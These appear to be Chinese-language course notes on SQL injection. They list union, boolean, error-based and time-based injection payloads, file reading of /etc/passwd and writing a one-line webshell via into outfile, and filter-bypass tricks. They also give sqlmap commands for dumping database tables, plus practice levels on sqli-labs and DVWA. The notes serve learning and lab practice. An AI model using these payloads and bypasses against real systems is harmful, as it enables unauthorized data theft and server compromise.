# 复习
  * Burp -- Intruder
  * SQL 注入
    - 原理 ： 输入-语句-执行
    - ' and 1=1 / and 1=2
    - oder by 5/union select 1,2/information_schema.tables/columns
    - and exists(select user from admin)
    - ascii(mid((select user from admin limit 0,1),1,1))>96
    - mid=substring/ascii=ord
    - python-chr/ord
    - 闭合 --- 报错  ''1'''   ''1'')' " \  %df
    - url %27 / hex / base64
    - %20 +
# Web安全
## SQL注入
### 注入类型
#### 报错注入
  * floor()/updatexml(xml,a,b)/extractvalue()
  - updatexml(1,concat(0x7e,version(),0x7e),2)
#### 延时注入
  * sleep()
  - if(bool,1,2)
#### 文件读写
  * root -- user()/mysql < 5.5
  * 读： load_file('path') 绝对路径
  - /etc/passwd
  * 写： into outfile 'path'
  - 一句话
  - ' " % ) `
#### 二阶注入
  * ?id=1 -- select
  * insert -- select
#### 绕过
  * and/or/select/union
    - and=&,or=|
    - 大小写 SelEct
    - 双写 uniunionon
    - 编码 sel%65ct，16进制，base64
    - 内联注释 sel/*cc*/ect
  * 注释
    - select * from user where id='1' or '1'
  * 空格
    - %20 - +
    - %a0 %00 %0a %0b
### 注入工具
  * sqlmap
  1. sqlmap -u "url"  -- 检测是否存在注入
  2. 库 --current-db
  3. 表 -D security --tables
  4. 列 -D security -T users --columns
  5. 内容 -D security -T users -C user --dump
  * --level 1 3
  * -r
  * --cookie="security=low;PHPSESSID=sl6npvo5ldlke35vlf5a26p213"
  * sqlmap dvwa
  * sql注入存在的位置 - 凡是和数据库交互
    - ?id=1   -- GET
    - POST

    insert into user(1,2) values('1','2'); -- ')
    select * from user where username='admin'#' and pwd='11'
    update user set passwd='123' where user='admin'#'

  - 练习 sqli-lab： 5/7/9/11/24/25/27
# 总结
1. 联合查询
2. 暴力破解（布尔注入）
3. 文件读写
4. 报错/延时
5. 绕过
